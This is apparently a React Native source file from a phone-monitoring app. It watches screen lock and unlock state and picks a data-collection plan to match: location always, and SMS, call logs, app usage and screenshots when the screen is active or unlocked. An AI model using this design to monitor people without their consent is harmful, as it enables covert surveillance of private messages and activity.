import { AppState, NativeModules, NativeEventEmitter, Platform } from 'react-native'
import AsyncStorage from '@react-native-async-storage/async-storage'

export type ScreenState = 'active' | 'inactive' | 'locked' | 'background'

let currentState: ScreenState = 'active'
let listeners: Array<(state: ScreenState) => void> = []
let screenCheckInterval: ReturnType<typeof setInterval> | null = null

export function getCurrentScreenState(): ScreenState { return currentState }

export function onScreenStateChange(callback: (state: ScreenState) => void) {
  listeners.push(callback)
  return () => { listeners = listeners.filter((l) => l !== callback) }
}

function notifyListeners(state: ScreenState) {
  if (state !== currentState) { currentState = state; listeners.forEach((l) => l(state)) }
}

export function startScreenStateMonitoring() {
  AppState.addEventListener('change', (appState) => {
    if (appState === 'active') notifyListeners('active')
    else if (appState === 'inactive') notifyListeners('inactive')
    else notifyListeners('background')
  })

  if (Platform.OS === 'android') {
    try {
      const { ScreenStateModule } = NativeModules
      if (ScreenStateModule) {
        const emitter = new NativeEventEmitter(ScreenStateModule)
        emitter.addListener('onScreenStateChanged', (event: { state: string }) => {
          if (event.state === 'locked') notifyListeners('locked')
          else if (event.state === 'unlocked') notifyListeners('active')
        })
        ScreenStateModule.startMonitoring()
      }
    } catch {}
  }

  screenCheckInterval = setInterval(async () => {
    if (Platform.OS === 'android') {
      try {
        const { ScreenStateModule } = NativeModules
        if (ScreenStateModule) {
          const isScreenOn = await ScreenStateModule.isScreenOn()
          const isLocked = await ScreenStateModule.isDeviceLocked()
          if (!isScreenOn) notifyListeners('locked')
          else if (isLocked) notifyListeners('locked')
          else notifyListeners('active')
        }
      } catch {}
    }
  }, 30000)
}

export function stopScreenStateMonitoring() {
  if (screenCheckInterval) { clearInterval(screenCheckInterval); screenCheckInterval = null }
}

export function getSyncPlan(state: ScreenState, trigger: string) {
  const plans: Record<string, { shouldSyncLocation: boolean; shouldSyncFullData: boolean; shouldCaptureScreenshot: boolean; shouldSyncSms: boolean; shouldSyncCallLog: boolean; shouldSyncAppUsage: boolean; shouldScanThreats: boolean; reason: string }> = {
    'locked-location': { shouldSyncLocation: true, shouldSyncFullData: false, shouldCaptureScreenshot: false, shouldSyncSms: false, shouldSyncCallLog: false, shouldSyncAppUsage: false, shouldScanThreats: false, reason: 'Screen locked — location only' },
    'active-timer': { shouldSyncLocation: true, shouldSyncFullData: true, shouldCaptureScreenshot: false, shouldSyncSms: true, shouldSyncCallLog: true, shouldSyncAppUsage: true, shouldScanThreats: true, reason: 'Screen active — full data sync' },
    'active-unlock': { shouldSyncLocation: true, shouldSyncFullData: true, shouldCaptureScreenshot: true, shouldSyncSms: true, shouldSyncCallLog: true, shouldSyncAppUsage: true, shouldScanThreats: true, reason: 'Screen unlocked — full sync + screenshot' },
    'background-timer': { shouldSyncLocation: true, shouldSyncFullData: false, shouldCaptureScreenshot: false, shouldSyncSms: false, shouldSyncCallLog: false, shouldSyncAppUsage: false, shouldScanThreats: false, reason: 'Background — location only' },
    'boot-boot': { shouldSyncLocation: true, shouldSyncFullData: false, shouldCaptureScreenshot: false, shouldSyncSms: false, shouldSyncCallLog: false, shouldSyncAppUsage: false, shouldScanThreats: false, reason: 'Boot — location only' },
    'active-manual': { shouldSyncLocation: true, shouldSyncFullData: true, shouldCaptureScreenshot: true, shouldSyncSms: true, shouldSyncCallLog: true, shouldSyncAppUsage: true, shouldScanThreats: true, reason: 'Manual sync — full data + screenshot' },
  }
  const key = `${state}-${trigger}`
  return plans[key] || plans['locked-location']
}